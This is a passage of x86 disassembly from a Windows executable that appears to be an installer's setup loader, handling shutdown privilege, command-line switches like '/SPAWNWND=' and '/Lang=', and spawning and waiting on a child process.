  409452:	75 5b                	jne    0x4094af
  409454:	54                   	push   %esp
  409455:	6a 28                	push   $0x28
  409457:	e8 b8 af ff ff       	call   0x404414
  40945c:	50                   	push   %eax
  40945d:	e8 42 af ff ff       	call   0x4043a4
  409462:	85 c0                	test   %eax,%eax
  409464:	75 04                	jne    0x40946a
  409466:	33 c0                	xor    %eax,%eax
  409468:	eb 54                	jmp    0x4094be
  40946a:	8d 44 24 08          	lea    0x8(%esp),%eax
  40946e:	50                   	push   %eax
  40946f:	68 c4 94 40 00       	push   $0x4094c4
  409474:	6a 00                	push   $0x0
  409476:	e8 21 af ff ff       	call   0x40439c
  40947b:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  409482:	00 
  409483:	c7 44 24 10 02 00 00 	movl   $0x2,0x10(%esp)
  40948a:	00 
  40948b:	6a 00                	push   $0x0
  40948d:	6a 00                	push   $0x0
  40948f:	6a 00                	push   $0x0
  409491:	8d 44 24 10          	lea    0x10(%esp),%eax
  409495:	50                   	push   %eax
  409496:	6a 00                	push   $0x0
  409498:	8b 44 24 14          	mov    0x14(%esp),%eax
  40949c:	50                   	push   %eax
  40949d:	e8 9e ff ff ff       	call   0x409440
  4094a2:	e8 9d af ff ff       	call   0x404444
  4094a7:	85 c0                	test   %eax,%eax
  4094a9:	74 04                	je     0x4094af
  4094ab:	33 c0                	xor    %eax,%eax
  4094ad:	eb 0f                	jmp    0x4094be
  4094af:	6a 00                	push   $0x0
  4094b1:	6a 02                	push   $0x2
  4094b3:	e8 8c b0 ff ff       	call   0x404544
  4094b8:	f7 d8                	neg    %eax
  4094ba:	1b c0                	sbb    %eax,%eax
  4094bc:	f7 d8                	neg    %eax
  4094be:	83 c4 14             	add    $0x14,%esp
  4094c1:	c3                   	ret
  4094c2:	00 00                	add    %al,(%eax)
  4094c4:	53                   	push   %ebx
  4094c5:	65 53                	gs push %ebx
  4094c7:	68 75 74 64 6f       	push   $0x6f647475
  4094cc:	77 6e                	ja     0x40953c
  4094ce:	50                   	push   %eax
  4094cf:	72 69                	jb     0x40953a
  4094d1:	76 69                	jbe    0x40953c
  4094d3:	6c                   	insb   (%dx),%es:(%edi)
  4094d4:	65 67 65 00 55 8b    	gs add %dl,%gs:-0x75(%di)
  4094da:	ec                   	in     (%dx),%al
  4094db:	51                   	push   %ecx
  4094dc:	53                   	push   %ebx
  4094dd:	56                   	push   %esi
  4094de:	57                   	push   %edi
  4094df:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4094e2:	8b d8                	mov    %eax,%ebx
  4094e4:	8b f1                	mov    %ecx,%esi
  4094e6:	4e                   	dec    %esi
  4094e7:	85 f6                	test   %esi,%esi
  4094e9:	7c 47                	jl     0x409532
  4094eb:	46                   	inc    %esi
  4094ec:	33 ff                	xor    %edi,%edi
  4094ee:	83 ff 01             	cmp    $0x1,%edi
  4094f1:	75 0b                	jne    0x4094fe
  4094f3:	8b 45 0c             	mov    0xc(%ebp),%eax
  4094f6:	50                   	push   %eax
  4094f7:	e8 f0 af ff ff       	call   0x4044ec
  4094fc:	eb 0e                	jmp    0x40950c
  4094fe:	83 ff 01             	cmp    $0x1,%edi
  409501:	7e 09                	jle    0x40950c
  409503:	8b 45 08             	mov    0x8(%ebp),%eax
  409506:	50                   	push   %eax
  409507:	e8 e0 af ff ff       	call   0x4044ec
  40950c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40950f:	8b c3                	mov    %ebx,%eax
  409511:	e8 a6 fa ff ff       	call   0x408fbc
  409516:	85 c0                	test   %eax,%eax
  409518:	75 18                	jne    0x409532
  40951a:	e8 25 af ff ff       	call   0x404444
  40951f:	83 f8 02             	cmp    $0x2,%eax
  409522:	74 0e                	je     0x409532
  409524:	e8 1b af ff ff       	call   0x404444
  409529:	83 f8 03             	cmp    $0x3,%eax
  40952c:	74 04                	je     0x409532
  40952e:	47                   	inc    %edi
  40952f:	4e                   	dec    %esi
  409530:	75 bc                	jne    0x4094ee
  409532:	5f                   	pop    %edi
  409533:	5e                   	pop    %esi
  409534:	5b                   	pop    %ebx
  409535:	59                   	pop    %ecx
  409536:	5d                   	pop    %ebp
  409537:	c2 08 00             	ret    $0x8
  40953a:	8b c0                	mov    %eax,%eax
  40953c:	55                   	push   %ebp
  40953d:	8b ec                	mov    %esp,%ebp
  40953f:	83 c4 f8             	add    $0xfffffff8,%esp
  409542:	53                   	push   %ebx
  409543:	56                   	push   %esi
  409544:	57                   	push   %edi
  409545:	8b f9                	mov    %ecx,%edi
  409547:	88 55 ff             	mov    %dl,-0x1(%ebp)
  40954a:	8b f0                	mov    %eax,%esi
  40954c:	8b 45 08             	mov    0x8(%ebp),%eax
  40954f:	33 d2                	xor    %edx,%edx
  409551:	89 10                	mov    %edx,(%eax)
  409553:	c6 45 fe 00          	movb   $0x0,-0x2(%ebp)
  409557:	85 ff                	test   %edi,%edi
  409559:	74 2e                	je     0x409589
  40955b:	33 db                	xor    %ebx,%ebx
  40955d:	eb 1f                	jmp    0x40957e
  40955f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409562:	8b 10                	mov    (%eax),%edx
  409564:	8b c7                	mov    %edi,%eax
  409566:	e8 c5 b6 ff ff       	call   0x404c30
  40956b:	85 c0                	test   %eax,%eax
  40956d:	75 0e                	jne    0x40957d
  40956f:	8b 45 08             	mov    0x8(%ebp),%eax
  409572:	89 18                	mov    %ebx,(%eax)
  409574:	c6 45 fe 02          	movb   $0x2,-0x2(%ebp)
  409578:	e9 bc 00 00 00       	jmp    0x409639
  40957d:	43                   	inc    %ebx
  40957e:	8d 55 f8             	lea    -0x8(%ebp),%edx
  409581:	8b c3                	mov    %ebx,%eax
  409583:	ff d6                	call   *%esi
  409585:	84 c0                	test   %al,%al
  409587:	75 d6                	jne    0x40955f
  409589:	8a 45 ff             	mov    -0x1(%ebp),%al
  40958c:	2c 01                	sub    $0x1,%al
  40958e:	72 04                	jb     0x409594
  409590:	74 0b                	je     0x40959d
  409592:	eb 12                	jmp    0x4095a6
  409594:	e8 8b da ff ff       	call   0x407024
  409599:	8b f8                	mov    %eax,%edi
  40959b:	eb 0b                	jmp    0x4095a8
  40959d:	e8 da ae ff ff       	call   0x40447c
  4095a2:	8b f8                	mov    %eax,%edi
  4095a4:	eb 02                	jmp    0x4095a8
  4095a6:	33 ff                	xor    %edi,%edi
  4095a8:	66 85 ff             	test   %di,%di
  4095ab:	0f 84 88 00 00 00    	je     0x409639
  4095b1:	33 db                	xor    %ebx,%ebx
  4095b3:	eb 2f                	jmp    0x4095e4
  4095b5:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4095b8:	8b 40 28             	mov    0x28(%eax),%eax
  4095bb:	0f b7 d7             	movzwl %di,%edx
  4095be:	3b c2                	cmp    %edx,%eax
  4095c0:	75 21                	jne    0x4095e3
  4095c2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4095c5:	83 78 2c 00          	cmpl   $0x0,0x2c(%eax)
  4095c9:	74 0d                	je     0x4095d8
  4095cb:	e8 34 ae ff ff       	call   0x404404
  4095d0:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4095d3:	3b 42 2c             	cmp    0x2c(%edx),%eax
  4095d6:	75 0b                	jne    0x4095e3
  4095d8:	8b 45 08             	mov    0x8(%ebp),%eax
  4095db:	89 18                	mov    %ebx,(%eax)
  4095dd:	c6 45 fe 01          	movb   $0x1,-0x2(%ebp)
  4095e1:	eb 56                	jmp    0x409639
  4095e3:	43                   	inc    %ebx
  4095e4:	8d 55 f8             	lea    -0x8(%ebp),%edx
  4095e7:	8b c3                	mov    %ebx,%eax
  4095e9:	ff d6                	call   *%esi
  4095eb:	84 c0                	test   %al,%al
  4095ed:	75 c6                	jne    0x4095b5
  4095ef:	33 db                	xor    %ebx,%ebx
  4095f1:	eb 3b                	jmp    0x40962e
  4095f3:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4095f6:	8b 40 28             	mov    0x28(%eax),%eax
  4095f9:	25 ff 03 00 00       	and    $0x3ff,%eax
  4095fe:	8b d7                	mov    %edi,%edx
  409600:	66 81 e2 ff 03       	and    $0x3ff,%dx
  409605:	0f b7 d2             	movzwl %dx,%edx
  409608:	3b c2                	cmp    %edx,%eax
  40960a:	75 21                	jne    0x40962d
  40960c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40960f:	83 78 2c 00          	cmpl   $0x0,0x2c(%eax)
  409613:	74 0d                	je     0x409622
  409615:	e8 ea ad ff ff       	call   0x404404
  40961a:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40961d:	3b 42 2c             	cmp    0x2c(%edx),%eax
  409620:	75 0b                	jne    0x40962d
  409622:	8b 45 08             	mov    0x8(%ebp),%eax
  409625:	89 18                	mov    %ebx,(%eax)
  409627:	c6 45 fe 01          	movb   $0x1,-0x2(%ebp)
  40962b:	eb 0c                	jmp    0x409639
  40962d:	43                   	inc    %ebx
  40962e:	8d 55 f8             	lea    -0x8(%ebp),%edx
  409631:	8b c3                	mov    %ebx,%eax
  409633:	ff d6                	call   *%esi
  409635:	84 c0                	test   %al,%al
  409637:	75 ba                	jne    0x4095f3
  409639:	8a 45 fe             	mov    -0x2(%ebp),%al
  40963c:	5f                   	pop    %edi
  40963d:	5e                   	pop    %esi
  40963e:	5b                   	pop    %ebx
  40963f:	59                   	pop    %ecx
  409640:	59                   	pop    %ecx
  409641:	5d                   	pop    %ebp
  409642:	c2 04 00             	ret    $0x4
  409645:	8d 40 00             	lea    0x0(%eax),%eax
  409648:	55                   	push   %ebp
  409649:	8b ec                	mov    %esp,%ebp
  40964b:	83 c4 e8             	add    $0xffffffe8,%esp
  40964e:	53                   	push   %ebx
  40964f:	56                   	push   %esi
  409650:	57                   	push   %edi
  409651:	33 d2                	xor    %edx,%edx
  409653:	89 55 fc             	mov    %edx,-0x4(%ebp)
  409656:	89 55 ec             	mov    %edx,-0x14(%ebp)
  409659:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40965c:	8b d8                	mov    %eax,%ebx
  40965e:	33 c0                	xor    %eax,%eax
  409660:	55                   	push   %ebp
  409661:	68 eb 96 40 00       	push   $0x4096eb
  409666:	64 ff 30             	push   %fs:(%eax)
  409669:	64 89 20             	mov    %esp,%fs:(%eax)
  40966c:	e8 d3 ad ff ff       	call   0x404444
  409671:	8b f0                	mov    %eax,%esi
  409673:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409676:	50                   	push   %eax
  409677:	33 c0                	xor    %eax,%eax
  409679:	8a c3                	mov    %bl,%al
  40967b:	8b 04 85 5c c9 40 00 	mov    0x40c95c(,%eax,4),%eax
  409682:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409685:	8d 55 ec             	lea    -0x14(%ebp),%edx
  409688:	8b c6                	mov    %esi,%eax
  40968a:	e8 f5 b5 ff ff       	call   0x404c84
  40968f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  409692:	89 45 f4             	mov    %eax,-0xc(%ebp)
  409695:	8d 55 e8             	lea    -0x18(%ebp),%edx
  409698:	8b c6                	mov    %esi,%eax
  40969a:	e8 e5 db ff ff       	call   0x407284
  40969f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4096a2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4096a5:	8d 55 f0             	lea    -0x10(%ebp),%edx
  4096a8:	b9 02 00 00 00       	mov    $0x2,%ecx
  4096ad:	b0 67                	mov    $0x67,%al
  4096af:	e8 f4 f6 ff ff       	call   0x408da8
  4096b4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4096b7:	b2 01                	mov    $0x1,%dl
  4096b9:	b8 50 46 40 00       	mov    $0x404650,%eax
  4096be:	e8 bd c1 ff ff       	call   0x405880
  4096c3:	e8 ec 97 ff ff       	call   0x402eb4
  4096c8:	33 c0                	xor    %eax,%eax
  4096ca:	5a                   	pop    %edx
  4096cb:	59                   	pop    %ecx
  4096cc:	59                   	pop    %ecx
  4096cd:	64 89 10             	mov    %edx,%fs:(%eax)
  4096d0:	68 f2 96 40 00       	push   $0x4096f2
  4096d5:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4096d8:	ba 02 00 00 00       	mov    $0x2,%edx
  4096dd:	e8 d6 9a ff ff       	call   0x4031b8
  4096e2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4096e5:	e8 ae 9a ff ff       	call   0x403198
  4096ea:	c3                   	ret
  4096eb:	e9 0c 97 ff ff       	jmp    0x402dfc
  4096f0:	eb e3                	jmp    0x4096d5
  4096f2:	5f                   	pop    %edi
  4096f3:	5e                   	pop    %esi
  4096f4:	5b                   	pop    %ebx
  4096f5:	8b e5                	mov    %ebp,%esp
  4096f7:	5d                   	pop    %ebp
  4096f8:	c3                   	ret
  4096f9:	8d 40 00             	lea    0x0(%eax),%eax
  4096fc:	55                   	push   %ebp
  4096fd:	8b ec                	mov    %esp,%ebp
  4096ff:	6a 00                	push   $0x0
  409701:	53                   	push   %ebx
  409702:	56                   	push   %esi
  409703:	57                   	push   %edi
  409704:	33 c0                	xor    %eax,%eax
  409706:	55                   	push   %ebp
  409707:	68 5b 97 40 00       	push   $0x40975b
  40970c:	64 ff 30             	push   %fs:(%eax)
  40970f:	64 89 20             	mov    %esp,%fs:(%eax)
  409712:	e8 85 bf ff ff       	call   0x40569c
  409717:	ba a0 46 40 00       	mov    $0x4046a0,%edx
  40971c:	e8 4b 92 ff ff       	call   0x40296c
  409721:	84 c0                	test   %al,%al
  409723:	75 20                	jne    0x409745
  409725:	6a 10                	push   $0x10
  409727:	a1 84 ca 40 00       	mov    0x40ca84,%eax
  40972c:	50                   	push   %eax
  40972d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409730:	e8 d7 da ff ff       	call   0x40720c
  409735:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409738:	e8 d7 9c ff ff       	call   0x403414
  40973d:	50                   	push   %eax
  40973e:	6a 00                	push   $0x0
  409740:	e8 0f ae ff ff       	call   0x404554
  409745:	33 c0                	xor    %eax,%eax
  409747:	5a                   	pop    %edx
  409748:	59                   	pop    %ecx
  409749:	59                   	pop    %ecx
  40974a:	64 89 10             	mov    %edx,%fs:(%eax)
  40974d:	68 62 97 40 00       	push   $0x409762
  409752:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409755:	e8 3e 9a ff ff       	call   0x403198
  40975a:	c3                   	ret
  40975b:	e9 9c 96 ff ff       	jmp    0x402dfc
  409760:	eb f0                	jmp    0x409752
  409762:	5f                   	pop    %edi
  409763:	5e                   	pop    %esi
  409764:	5b                   	pop    %ebx
  409765:	59                   	pop    %ecx
  409766:	5d                   	pop    %ebp
  409767:	c3                   	ret
  409768:	55                   	push   %ebp
  409769:	8b ec                	mov    %esp,%ebp
  40976b:	6a 00                	push   $0x0
  40976d:	6a 00                	push   $0x0
  40976f:	53                   	push   %ebx
  409770:	56                   	push   %esi
  409771:	57                   	push   %edi
  409772:	33 c0                	xor    %eax,%eax
  409774:	55                   	push   %ebp
  409775:	68 40 98 40 00       	push   $0x409840
  40977a:	64 ff 30             	push   %fs:(%eax)
  40977d:	64 89 20             	mov    %esp,%fs:(%eax)
  409780:	e8 4b d4 ff ff       	call   0x406bd0
  409785:	8b d8                	mov    %eax,%ebx
  409787:	85 db                	test   %ebx,%ebx
  409789:	0f 8e 96 00 00 00    	jle    0x409825
  40978f:	be 01 00 00 00       	mov    $0x1,%esi
  409794:	8d 55 fc             	lea    -0x4(%ebp),%edx
  409797:	8b c6                	mov    %esi,%eax
  409799:	e8 8e d4 ff ff       	call   0x406c2c
  40979e:	ba 58 98 40 00       	mov    $0x409858,%edx
  4097a3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4097a6:	e8 85 b4 ff ff       	call   0x404c30
  4097ab:	85 c0                	test   %eax,%eax
  4097ad:	74 27                	je     0x4097d6
  4097af:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4097b2:	50                   	push   %eax
  4097b3:	b9 0a 00 00 00       	mov    $0xa,%ecx
  4097b8:	ba 01 00 00 00       	mov    $0x1,%edx
  4097bd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4097c0:	e8 8f 9c ff ff       	call   0x403454
  4097c5:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4097c8:	ba 68 98 40 00       	mov    $0x409868,%edx
  4097cd:	e8 5e b4 ff ff       	call   0x404c30
  4097d2:	85 c0                	test   %eax,%eax
  4097d4:	75 09                	jne    0x4097df
  4097d6:	c6 05 34 b2 40 00 01 	movb   $0x1,0x40b234
  4097dd:	eb 3e                	jmp    0x40981d
  4097df:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4097e2:	50                   	push   %eax
  4097e3:	b9 06 00 00 00       	mov    $0x6,%ecx
  4097e8:	ba 01 00 00 00       	mov    $0x1,%edx
  4097ed:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4097f0:	e8 5f 9c ff ff       	call   0x403454
  4097f5:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4097f8:	ba 7c 98 40 00       	mov    $0x40987c,%edx
  4097fd:	e8 2e b4 ff ff       	call   0x404c30
  409802:	85 c0                	test   %eax,%eax
  409804:	75 17                	jne    0x40981d
  409806:	68 d8 cc 40 00       	push   $0x40ccd8
  40980b:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
  409810:	ba 07 00 00 00       	mov    $0x7,%edx
  409815:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409818:	e8 37 9c ff ff       	call   0x403454
  40981d:	46                   	inc    %esi
  40981e:	4b                   	dec    %ebx
  40981f:	0f 85 6f ff ff ff    	jne    0x409794
  409825:	33 c0                	xor    %eax,%eax
  409827:	5a                   	pop    %edx
  409828:	59                   	pop    %ecx
  409829:	59                   	pop    %ecx
  40982a:	64 89 10             	mov    %edx,%fs:(%eax)
  40982d:	68 47 98 40 00       	push   $0x409847
  409832:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409835:	ba 02 00 00 00       	mov    $0x2,%edx
  40983a:	e8 79 99 ff ff       	call   0x4031b8
  40983f:	c3                   	ret
  409840:	e9 b7 95 ff ff       	jmp    0x402dfc
  409845:	eb eb                	jmp    0x409832
  409847:	5f                   	pop    %edi
  409848:	5e                   	pop    %esi
  409849:	5b                   	pop    %ebx
  40984a:	59                   	pop    %ecx
  40984b:	59                   	pop    %ecx
  40984c:	5d                   	pop    %ebp
  40984d:	c3                   	ret
  40984e:	00 00                	add    %al,(%eax)
  409850:	ff                   	(bad)
  409851:	ff                   	(bad)
  409852:	ff                   	(bad)
  409853:	ff 04 00             	incl   (%eax,%eax,1)
  409856:	00 00                	add    %al,(%eax)
  409858:	2f                   	das
  409859:	53                   	push   %ebx
  40985a:	50                   	push   %eax
  40985b:	2d 00 00 00 00       	sub    $0x0,%eax
  409860:	ff                   	(bad)
  409861:	ff                   	(bad)
  409862:	ff                   	(bad)
  409863:	ff 0a                	decl   (%edx)
  409865:	00 00                	add    %al,(%eax)
  409867:	00 2f                	add    %ch,(%edi)
  409869:	53                   	push   %ebx
  40986a:	50                   	push   %eax
  40986b:	41                   	inc    %ecx
  40986c:	57                   	push   %edi
  40986d:	4e                   	dec    %esi
  40986e:	57                   	push   %edi
  40986f:	4e                   	dec    %esi
  409870:	44                   	inc    %esp
  409871:	3d 00 00 ff ff       	cmp    $0xffff0000,%eax
  409876:	ff                   	(bad)
  409877:	ff 06                	incl   (%esi)
  409879:	00 00                	add    %al,(%eax)
  40987b:	00 2f                	add    %ch,(%edi)
  40987d:	4c                   	dec    %esp
  40987e:	61                   	popa
  40987f:	6e                   	outsb  %ds:(%esi),(%dx)
  409880:	67 3d 00 00 53 56    	addr16 cmp $0x56530000,%eax
  409886:	8b d8                	mov    %eax,%ebx
  409888:	85 db                	test   %ebx,%ebx
  40988a:	7c 40                	jl     0x4098cc
  40988c:	3b 1d 1c ce 40 00    	cmp    0x40ce1c,%ebx
  409892:	7d 38                	jge    0x4098cc
  409894:	3b 1d 38 b2 40 00    	cmp    0x40b238,%ebx
  40989a:	74 30                	je     0x4098cc
  40989c:	8b f3                	mov    %ebx,%esi
  40989e:	c1 e6 06             	shl    $0x6,%esi
  4098a1:	03 f3                	add    %ebx,%esi
  4098a3:	a1 18 ce 40 00       	mov    0x40ce18,%eax
  4098a8:	8b 44 30 18          	mov    0x18(%eax,%esi,1),%eax
  4098ac:	e8 43 9a ff ff       	call   0x4032f4
  4098b1:	50                   	push   %eax
  4098b2:	a1 18 ce 40 00       	mov    0x40ce18,%eax
  4098b7:	8d 44 30 18          	lea    0x18(%eax,%esi,1),%eax
  4098bb:	e8 60 9b ff ff       	call   0x403420
  4098c0:	5a                   	pop    %edx
  4098c1:	e8 ba f5 ff ff       	call   0x408e80
  4098c6:	89 1d 38 b2 40 00    	mov    %ebx,0x40b238
  4098cc:	5e                   	pop    %esi
  4098cd:	5b                   	pop    %ebx
  4098ce:	c3                   	ret
  4098cf:	90                   	nop
  4098d0:	33 c9                	xor    %ecx,%ecx
  4098d2:	3b 05 1c ce 40 00    	cmp    0x40ce1c,%eax
  4098d8:	7d 14                	jge    0x4098ee
  4098da:	8b c8                	mov    %eax,%ecx
  4098dc:	c1 e0 06             	shl    $0x6,%eax
  4098df:	03 c1                	add    %ecx,%eax
  4098e1:	8b 0d 18 ce 40 00    	mov    0x40ce18,%ecx
  4098e7:	8d 04 01             	lea    (%ecx,%eax,1),%eax
  4098ea:	89 02                	mov    %eax,(%edx)
  4098ec:	b1 01                	mov    $0x1,%cl
  4098ee:	8b c1                	mov    %ecx,%eax
  4098f0:	c3                   	ret
  4098f1:	8d 40 00             	lea    0x0(%eax),%eax
  4098f4:	51                   	push   %ecx
  4098f5:	54                   	push   %esp
  4098f6:	b8 d0 98 40 00       	mov    $0x4098d0,%eax
  4098fb:	8b 0d d8 cc 40 00    	mov    0x40ccd8,%ecx
  409901:	8a 15 04 ce 40 00    	mov    0x40ce04,%dl
  409907:	e8 30 fc ff ff       	call   0x40953c
  40990c:	8b 04 24             	mov    (%esp),%eax
  40990f:	e8 70 ff ff ff       	call   0x409884
  409914:	5a                   	pop    %edx
  409915:	c3                   	ret
  409916:	8b c0                	mov    %eax,%eax
  409918:	55                   	push   %ebp
  409919:	8b ec                	mov    %esp,%ebp
  40991b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40991e:	33 d2                	xor    %edx,%edx
  409920:	8b c8                	mov    %eax,%ecx
  409922:	83 e9 11             	sub    $0x11,%ecx
  409925:	74 49                	je     0x409970
  409927:	81 e9 85 04 00 00    	sub    $0x485,%ecx
  40992d:	74 02                	je     0x409931
  40992f:	eb 25                	jmp    0x409956
  409931:	81 7d 10 10 27 00 00 	cmpl   $0x2710,0x10(%ebp)
  409938:	75 09                	jne    0x409943
  40993a:	c6 05 48 b2 40 00 01 	movb   $0x1,0x40b248
  409941:	eb 2d                	jmp    0x409970
  409943:	81 7d 10 11 27 00 00 	cmpl   $0x2711,0x10(%ebp)
  40994a:	75 24                	jne    0x409970
  40994c:	8b 45 14             	mov    0x14(%ebp),%eax
  40994f:	a3 3c b2 40 00       	mov    %eax,0x40b23c
  409954:	eb 1a                	jmp    0x409970
  409956:	8b 55 14             	mov    0x14(%ebp),%edx
  409959:	52                   	push   %edx
  40995a:	8b 55 10             	mov    0x10(%ebp),%edx
  40995d:	52                   	push   %edx
  40995e:	50                   	push   %eax
  40995f:	8b 45 08             	mov    0x8(%ebp),%eax
  409962:	50                   	push   %eax
  409963:	a1 20 ce 40 00       	mov    0x40ce20,%eax
  409968:	50                   	push   %eax
  409969:	e8 ae ab ff ff       	call   0x40451c
  40996e:	8b d0                	mov    %eax,%edx
  409970:	8b c2                	mov    %edx,%eax
  409972:	5d                   	pop    %ebp
  409973:	c2 10 00             	ret    $0x10
  409976:	8b c0                	mov    %eax,%eax
  409978:	53                   	push   %ebx
  409979:	83 c4 e4             	add    $0xffffffe4,%esp
  40997c:	8b dc                	mov    %esp,%ebx
  40997e:	eb 0c                	jmp    0x40998c
  409980:	53                   	push   %ebx
  409981:	e8 ee ab ff ff       	call   0x404574
  409986:	53                   	push   %ebx
  409987:	e8 b0 ab ff ff       	call   0x40453c
  40998c:	6a 01                	push   $0x1
  40998e:	6a 00                	push   $0x0
  409990:	6a 00                	push   $0x0
  409992:	6a 00                	push   $0x0
  409994:	53                   	push   %ebx
  409995:	e8 ca ab ff ff       	call   0x404564
  40999a:	85 c0                	test   %eax,%eax
  40999c:	75 e2                	jne    0x409980
  40999e:	83 c4 1c             	add    $0x1c,%esp
  4099a1:	5b                   	pop    %ebx
  4099a2:	c3                   	ret
  4099a3:	90                   	nop
  4099a4:	55                   	push   %ebp
  4099a5:	8b ec                	mov    %esp,%ebp
  4099a7:	83 c4 a8             	add    $0xffffffa8,%esp
  4099aa:	53                   	push   %ebx
  4099ab:	56                   	push   %esi
  4099ac:	57                   	push   %edi
  4099ad:	33 db                	xor    %ebx,%ebx
  4099af:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4099b2:	8b f9                	mov    %ecx,%edi
  4099b4:	8b f2                	mov    %edx,%esi
  4099b6:	8b d8                	mov    %eax,%ebx
  4099b8:	33 c0                	xor    %eax,%eax
  4099ba:	55                   	push   %ebp
  4099bb:	68 77 9a 40 00       	push   $0x409a77
  4099c0:	64 ff 30             	push   %fs:(%eax)
  4099c3:	64 89 20             	mov    %esp,%fs:(%eax)
  4099c6:	68 90 9a 40 00       	push   $0x409a90
  4099cb:	53                   	push   %ebx
  4099cc:	68 9c 9a 40 00       	push   $0x409a9c
  4099d1:	56                   	push   %esi
  4099d2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4099d5:	ba 04 00 00 00       	mov    $0x4,%edx
  4099da:	e8 d5 99 ff ff       	call   0x4033b4
  4099df:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4099e2:	33 c9                	xor    %ecx,%ecx
  4099e4:	ba 44 00 00 00       	mov    $0x44,%edx
  4099e9:	e8 8e 8d ff ff       	call   0x40277c
  4099ee:	c7 45 b8 44 00 00 00 	movl   $0x44,-0x48(%ebp)
  4099f5:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4099f8:	50                   	push   %eax
  4099f9:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4099fc:	50                   	push   %eax
  4099fd:	6a 00                	push   $0x0
  4099ff:	6a 00                	push   $0x0
  409a01:	6a 00                	push   $0x0
  409a03:	6a 00                	push   $0x0
  409a05:	6a 00                	push   $0x0
  409a07:	6a 00                	push   $0x0
  409a09:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409a0c:	e8 03 9a ff ff       	call   0x403414
  409a11:	50                   	push   %eax
  409a12:	6a 00                	push   $0x0
  409a14:	e8 c3 a9 ff ff       	call   0x4043dc
  409a19:	85 c0                	test   %eax,%eax
  409a1b:	75 07                	jne    0x409a24
  409a1d:	b0 69                	mov    $0x69,%al
  409a1f:	e8 24 fc ff ff       	call   0x409648
  409a24:	8b 45 ac             	mov    -0x54(%ebp),%eax
  409a27:	50                   	push   %eax
  409a28:	e8 97 a9 ff ff       	call   0x4043c4
  409a2d:	e8 46 ff ff ff       	call   0x409978
  409a32:	68 ff 00 00 00       	push   $0xff
  409a37:	6a ff                	push   $0xffffffff
  409a39:	6a 00                	push   $0x0
  409a3b:	8d 45 a8             	lea    -0x58(%ebp),%eax
  409a3e:	50                   	push   %eax
  409a3f:	6a 01                	push   $0x1
  409a41:	e8 16 ab ff ff       	call   0x40455c
  409a46:	48                   	dec    %eax
  409a47:	74 e4                	je     0x409a2d
  409a49:	e8 2a ff ff ff       	call   0x409978
  409a4e:	57                   	push   %edi
  409a4f:	8b 45 a8             	mov    -0x58(%ebp),%eax
  409a52:	50                   	push   %eax
  409a53:	e8 cc a9 ff ff       	call   0x404424
  409a58:	8b 45 a8             	mov    -0x58(%ebp),%eax
  409a5b:	50                   	push   %eax
  409a5c:	e8 63 a9 ff ff       	call   0x4043c4
  409a61:	33 c0                	xor    %eax,%eax
  409a63:	5a                   	pop    %edx
  409a64:	59                   	pop    %ecx
  409a65:	59                   	pop    %ecx
  409a66:	64 89 10             	mov    %edx,%fs:(%eax)
  409a69:	68 7e 9a 40 00       	push   $0x409a7e
  409a6e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409a71:	e8 22 97 ff ff       	call   0x403198
  409a76:	c3                   	ret
  409a77:	e9 80 93 ff ff       	jmp    0x402dfc
  409a7c:	eb f0                	jmp    0x409a6e
  409a7e:	5f                   	pop    %edi
  409a7f:	5e                   	pop    %esi
  409a80:	5b                   	pop    %ebx
  409a81:	8b e5                	mov    %ebp,%esp
  409a83:	5d                   	pop    %ebp
  409a84:	c3                   	ret
  409a85:	00 00                	add    %al,(%eax)
  409a87:	00 ff                	add    %bh,%bh
  409a89:	ff                   	(bad)
  409a8a:	ff                   	(bad)
  409a8b:	ff 01                	incl   (%ecx)
  409a8d:	00 00                	add    %al,(%eax)
  409a8f:	00 22                	add    %ah,(%edx)
  409a91:	00 00                	add    %al,(%eax)
  409a93:	00 ff                	add    %bh,%bh
  409a95:	ff                   	(bad)
  409a96:	ff                   	(bad)
  409a97:	ff 02                	incl   (%edx)
  409a99:	00 00                	add    %al,(%eax)
  409a9b:	00 22                	add    %ah,(%edx)
  409a9d:	20 00                	and    %al,(%eax)
  409a9f:	00 83 3d d0 cb 40    	add    %al,0x40cbd03d(%ebx)
  409aa5:	00 00                	add    %al,(%eax)
  409aa7:	74 18                	je     0x409ac1
  409aa9:	8b 0d d0 cb 40 00    	mov    0x40cbd0,%ecx
  409aaf:	b2 01                	mov    $0x1,%dl
  409ab1:	b8 50 46 40 00       	mov    $0x404650,%eax
  409ab6:	e8 c5 bd ff ff       	call   0x405880
